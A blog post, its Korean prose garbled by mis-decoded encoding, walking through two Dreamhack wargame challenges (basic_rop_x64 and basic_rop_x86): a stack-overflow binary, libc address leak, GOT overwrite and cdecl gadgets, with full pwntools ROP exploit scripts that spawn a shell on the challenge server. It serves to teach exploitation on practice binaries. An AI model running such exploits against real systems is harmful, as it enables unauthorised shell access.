---
title:  "TIL: ROP ğŸ’ª"
excerpt: "2022.07.22 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---
## Wargame: [basic_rop_x64](https://dreamhack.io/wargame/challenges/29/)

Serverì—ì„œ ì‘ë™í•˜ëŠ” binaryì˜ source codeëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

### Vulnerability Scanning

gdbì—ì„œ `checksec` ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ë©´, **canaryì™€ PIEëŠ” disabled** ìƒíƒœì´ê³ , **NXë§Œ enable**ë˜ì–´ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.

<p align="center">
	<a href="/assets/images/TIL220722/Untitled.png">
	<img src="/assets/images/TIL220722/Untitled.png" width="350">
    </a>
</p>

Code ë‚´ì˜ `read`ë¥¼ ì´ìš©í•´ ì˜ˆì‹œ ì½”ë“œì™€ ë™ì¼í•œ ë°©ì‹ìœ¼ë¡œ **ROP ê¸°ë²•**ì„ í†µí•´ `system("/bin/sh")`ë¬¸ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.

### `system`ì˜ address ê³„ì‚°í•˜ê¸°

```python
from pwn import *

#p = process('./basic_rop_x64')
p = remote("host3.dreamhack.games", 23059)

e = ELF('./basic_rop_x64')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
pop_rdi = 0x0000000000400883
ret = 0x00000000004005a9

payload = b"A"*(0x40 + 0x8)

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

p.send(payload)
print(p.recvn(0x40)) 
read = u64(p.recvn(6) + b"\x00"*2)
print("read", hex(read))

#lb = read - libc.symbols["read"]
#system = lb + libc.symbols["system"]
system = read - 0xb1ec0

p.interactive()
```

ROP ê¸°ë²•ìœ¼ë¡œ `puts(read_got)`ë¥¼ ì‹¤í–‰í•´ `read`**ê°€ ì €ì¥ëœ addressë¥¼ ì¶œë ¥**í•˜ê³ , ì´ ê°’ì„ ì´ìš©í•´ serverì—ì„œ ì‚¬ìš©ì¤‘ì¸ **libcì˜ versionì„ íŒŒì•…**í•  ìˆ˜ ìˆë‹¤. `read`ë§Œ queryì— ë„£ì–´ì¤¬ì„ ë• ì—¬ëŸ¬ libc íŒŒì¼ë“¤ì´ ëœ° ìˆ˜ ìˆìœ¼ë‹ˆ `puts`ì˜ addressê¹Œì§€ ì¶œë ¥í•´ì„œ queryì— ë„£ìœ¼ë©´ ë” ì •í™•í•œ ê²€ìƒ‰ ê²°ê³¼ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

<p align="center">
	<a href="/assets/images/TIL220722/Untitled (1).png">
	<img src="/assets/images/TIL220722/Untitled (1).png" width="700">
    </a>
</p>
ì´ë¥¼ í†µí•´ `system`ê³¼ `read` ì‚¬ì´ì˜ offsetì„ íŒŒì•…í•˜ì—¬ `system`ì˜ addressë¥¼ ê³„ì‚°í•  ìˆ˜ ìˆë‹¤.

### Exploit

í° íë¦„ì€ ìœ„ì˜ ì˜ˆì œì™€ ê°™ë‹¤. ì˜¤íˆë ¤ canary íšë“ ê³¼ì •ì´ ì—†ì–´ ë” ê°„ë‹¨í•˜ë‹¤.

1. `puts(read_got)`ë¥¼ ì‹¤í–‰í•´ `read`**ì˜ address**ë¥¼ ì–»ëŠ”ë‹¤. ì´ë¡œë¶€í„° `system`**ì˜ addressë„ ê³„ì‚°**í•œë‹¤.
2. `read(0, read_got, 0x10)`ì„ ì‹¤í–‰í•´ `read_got`**ë¥¼** `system`**ì˜ addressì™€ â€œ/bin/shâ€ë¡œ overwrite**í•œë‹¤.
3. `read(â€/bin/shâ€)`ë¥¼ ì‹¤í–‰í•˜ë©´ GOTê°€ overwriteë˜ì–´ ìˆê¸° ë•Œë¬¸ì— `system("/bin/sh")`**ê°€ ì‹¤í–‰**ëœë‹¤.

```python
from pwn import *

#p = process('./basic_rop_x64')
p = remote("host3.dreamhack.games", 10061)

e = ELF('./basic_rop_x64')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
read_got = e.got['read']
pop_rdi = 0x0000000000400883
pop_rsi_pop_r15 = 0x0000000000400881
ret = 0x00000000004005a9

payload = b"A"*(0x40 + 0x8)

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(read_plt)

p.send(payload)
p.recvn(0x40) # source code ë‚´ì˜ writeë¬¸ì˜ ì¶œë ¥ê°’ ë„˜ê¸°ê¸°
read = u64(p.recvn(6) + b"\x00"*2) # readì˜ address
print("read", hex(read))

system = read - 0xb1ec0
p.send(p64(system) + b"/bin/sh\x00")

p.interactive()
```

## Wargame: [basic_rop_x86](https://dreamhack.io/wargame/challenges/30/)

ë¬¸ì œì˜ source codeëŠ” basic_rop_x64ì™€ ë™ì¼í•˜ì§€ë§Œ, **x86 architectureì„ ëŒ€ìƒìœ¼ë¡œ í•œë‹¤ëŠ” ì **ì´ ë‹¤ë¥´ë‹¤. í’€ì´ì˜ í° íë¦„ ì—­ì‹œ ê±°ì˜ ê°™ê¸° ë•Œë¬¸ì— x86 architectureì˜ íŠ¹ì„± ë•Œë¬¸ì— ë‹¬ë¼ì§€ëŠ” ì ë§Œì„ ì„œìˆ í•˜ê² ë‹¤.

### cdecl

*Reference: [https://velog.io/@seulifer/x86-cdecl](https://velog.io/@seulifer/x86-cdecl), [https://doongdangdoongdangdong.tistory.com/20](https://doongdangdoongdangdong.tistory.com/20), [https://kaspyx.tistory.com/100](https://kaspyx.tistory.com/100)*

**cdecl**ì€ x86 architectureì˜ calling conventionì´ë‹¤. **cdeclì—ì„œëŠ” í•¨ìˆ˜ì˜ argumentë¥¼ callerê°€ stackì„ í†µí•´ ì „ë‹¬í•˜ë©°, return ê°’ì€ eaxë¥¼ í†µí•´ ë°›ëŠ”ë‹¤.** êµ¬ì²´ì ì¸ stack frameì˜ êµ¬ì¡°ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

<p align="center">
	<a href="/assets/images/TIL220722/Untitled (2).png">
	<img src="/assets/images/TIL220722/Untitled (2).png" width="300">
    </a>
</p>
ë”°ë¼ì„œ ROP ê¸°ë²•ì„ ì‚¬ìš©í•  ë• ê¸°ì¡´ì˜ ë°©ì‹ëŒ€ë¡œ `pop rdi; ret`ê³¼ ê°™ì€ code gadgetì„ ì°¾ì•„ registerì— ê°’ì„ ë„£ì–´ì¤„ í•„ìš”ëŠ” ì—†ì§€ë§Œ, **stackì— ì§ì ‘ argumentë¥¼ ì§‘ì–´ë„£ì–´ì¤˜ì•¼ í•œë‹¤**. ë˜ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•œ ì´í›„ì—ëŠ” stackì— ë„£ì–´ ë‘ì—ˆë˜ argumentì˜ ê°œìˆ˜ë§Œí¼ espë¥¼ ì¦ê°€ì‹œì¼œì¤˜ì•¼ í•˜ë¯€ë¡œ **argumentì˜ ê°œìˆ˜ë§Œí¼ `pop`ì„ ì‹¤í–‰í•˜ê³  `ret`í•˜ëŠ” code gadgetì„ ë‹¤ìŒ functionì˜ address ë¶€ë¶„ì— ì‚½ì…**í•´ì•¼ í•œë‹¤. (`pop`ì˜ operandì˜ ê°’ì€ ì¤‘ìš”í•˜ì§€ ì•Šë‹¤.)

- argumentê°€ 3ê°œì¼ ë•Œ: `pop; pop; pop; ret`
- argumentê°€ 2ê°œì¼ ë•Œ: `pop; pop; ret`
- argumentê°€ 1ê°œì¼ ë•Œ: `pop; ret`
- argumentê°€ ì—†ì„ ë•Œ: `ret`

### Exploit

**32 bit machine**ìœ¼ë¡œ ë³€ê²½ë˜ë©´ì„œ ê³ ë ¤í•´ì•¼ í•  ì :

- Packingì„ í•  ë•Œ `p64`ê°€ ì•„ë‹Œ `p32`**ë¥¼ ì‚¬ìš©**í•´ì•¼ í•¨.
- Payloadë¥¼ ì‘ì„±í•  ë•Œ **cdeclì„ ê³ ë ¤**í•˜ì—¬ `pop; ret`, `pop; pop; pop; ret` gadgetì„ ì‚½ì…í•´ì•¼ í•¨.
- `write(1, read_got, 0x4)`ë¡œ `read`ì˜ addressë¥¼ ë°›ì•„ì˜¬ ë•Œ 8 byteê°€ ì•„ë‹ˆë¼ **4 byte**ë¥¼ ë°›ì•„ì™€ì•¼ í•¨.
- `read_got`ì˜ ë‹¤ìŒ byteì— `"/bin/sh"`ë¥¼ ì…ë ¥í•  ë•Œ `read_got + 0x8`ì´ ì•„ë‹ˆë¼ `read_got + 0x4`**ì— ì…ë ¥**í•´ì•¼ í•¨.

```python
from pwn import *

#p = process('./basic_rop_x86')
p = remote("host3.dreamhack.games", 15286)
#gdb.attach(p)

e = ELF('./basic_rop_x86')

write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts'] 
pr = 0x080483d9 # pop; ret
pppr = 0x08048689 # pop; pop; pop; ret

payload = b"A"*(0x40 + 0x8)

# write(1, read_got, 0x4)
payload += p32(write_plt)
payload += p32(pppr) # pop; pop; pop; ret
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# read(0, read_got, 0x10)
payload += p32(read_plt)
payload += p32(pppr) # pop; pop; pop; ret
payload += p32(0)
payload += p32(read_got)
payload += p32(0x10)

# read("/bin/sh") == system("/bin/sh")
payload += p32(read_plt)
payload += p32(pr)
payload += p32(read_got + 0x4)

p.send(payload)

p.recvn(0x40)
read = u32(p.recvn(4))
print ("read", hex(read))

system = read - 0x99a10
print(hex(system))
p.send(p32(system) + b"/bin/sh\x00")

p.interactive()
```